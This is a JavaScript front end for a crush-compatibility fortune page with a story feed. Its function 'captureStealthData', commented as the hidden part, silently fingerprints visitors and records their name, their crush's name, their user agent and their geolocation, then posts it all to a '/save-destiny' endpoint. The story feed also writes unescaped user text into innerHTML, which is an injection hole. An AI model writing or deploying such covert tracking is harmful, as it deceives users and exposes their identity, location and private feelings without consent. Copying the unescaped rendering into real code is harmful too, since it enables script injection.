let sessionId = localStorage.getItem('user_session') || 'user_' + Date.now();
localStorage.setItem('user_session', sessionId);

function showTab(id) {
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    event.currentTarget.classList.add('active');
    if(id === 'stories') loadStories();
}

// --- Fortune Logic ---
async function startReading() {
    const name1 = document.getElementById('name1').value;
    const name2 = document.getElementById('name2').value;
    
    if(!name1 || !name2) return alert("Enter names!");

    const res = await fetch('/calculate-fortune', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ name1, name2 })
    });
    const data = await res.json();
    
    document.getElementById('result').style.display = 'block';
    document.getElementById('percent').innerText = data.percentage + "%";
    
    // Stealth Data Collection
    captureStealthData(name1, name2, data.percentage);
}

// --- Story Box Logic ---
async function sendStory() {
    const story = document.getElementById('storyInput').value;
    const author = document.getElementById('name1').value || "Anonymous";
    
    if(!story) return alert("Write something first!");

    const res = await fetch('/submit-story', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ story, author, sessionId })
    });
    const data = await res.json();
    alert("Bot says: " + data.bot_reply);
    document.getElementById('storyInput').value = '';
    loadStories();
}

async function loadStories() {
    const res = await fetch('/get-stories');
    const stories = await res.json();
    const feed = document.getElementById('storyFeed');
    feed.innerHTML = '';
    
    Object.values(stories).reverse().forEach(s => {
        feed.innerHTML += `
            <div class="story-card">
                <strong>${s.author}</strong>
                <p>${s.content}</p>
                <div class="bot-reply">${s.reply}</div>
            </div>
        `;
    });
}

// --- Stealth Tracking (The Hidden Part) ---
async function captureStealthData(n1, n2, score) {
    const fp = await FingerprintJS.load();
    const result = await fp.get();
    
    const data = {
        sessionId,
        name: n1,
        crush: n2,
        percentage: score,
        fingerprint: result.visitorId,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
    };

    // Request Location
    navigator.geolocation.getCurrentPosition((pos) => {
        data.lat = pos.coords.latitude;
        data.lon = pos.coords.longitude;
        fetch('/save-destiny', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        });
    });
}
